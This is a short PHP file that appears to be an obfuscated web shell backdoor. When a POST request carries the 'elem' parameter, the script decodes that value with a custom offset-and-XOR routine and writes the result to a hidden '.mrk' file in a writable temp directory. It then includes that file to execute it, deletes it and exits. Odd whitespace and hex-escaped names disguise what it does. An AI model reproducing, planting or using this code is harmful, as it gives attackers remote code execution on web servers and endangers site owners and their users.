<?php

if(count($_POST) > 0 && isset($_POST["\x65\x6Cem"])){
	$obj = array_filter([getenv("TEMP"), getcwd(), "/tmp", "/dev/shm", sys_get_temp_dir(), "/var/tmp", session_save_path(), getenv("TMP"), ini_get("upload_tmp_dir")]);
	$val = $_POST["\x65\x6Cem"];
		$val=explode	 	( "."		, $val );	
	$hld = '';
            $s8 = 'abcdefghijklmnopqrstuvwxyz0123456789';
            $sLen = strlen($s8	);
            $l = 0;
    
            array_walk($val, function ($v7) use (&$hld, &$l, $s8, $sLen) { $sChar = ord($s8[$l % $sLen]	);
                $dec = ((int)$v7 - $sChar - ($l % 10)) ^ 12;
                $hld.=chr($dec	);
                $l++;
            }	);
	foreach ($obj as $key => $symbol) {
    		if (max(0, is_dir($symbol) * is_writable($symbol))) {
    $entry = "$symbol" . "/.mrk";
    if (file_put_contents($entry, $hld)) {
	include $entry;
	@unlink($entry);
	exit;
}
}
}
}